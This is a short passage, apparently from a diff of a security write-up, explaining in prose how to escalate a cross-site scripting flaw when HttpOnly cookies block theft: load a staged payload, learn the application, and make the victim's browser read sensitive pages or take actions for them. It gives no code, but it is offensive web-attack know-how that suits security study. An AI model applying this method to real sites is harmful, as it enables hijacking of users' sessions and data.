+- To fully weaponise XSS, we first need to have knowledge of what we have at hand. Many attempts could be done for this, such as attempting to steal the user's cookie value. But, with cookie security set to HttpOnly flag, this will be ruled out easily. So, we need to realise the power we have where we can fully execute XSS and load a staged payload to control user's browser. It is very important to browser the web application as a normal user at first to gain meaningful insights. Even if we achive an XSS on a page where there is not anything sensitive, we can instruct the browser to recover information from other, more sensitive pages or to perform state-changing actions on behalf of the user. So, all we need to do is understand the web appplication's functionality and tailor our XSS payload to leverage and use the functionality to our advantage. 
     
     
     
+    
+
+
+    
+
+
+
 
 
 
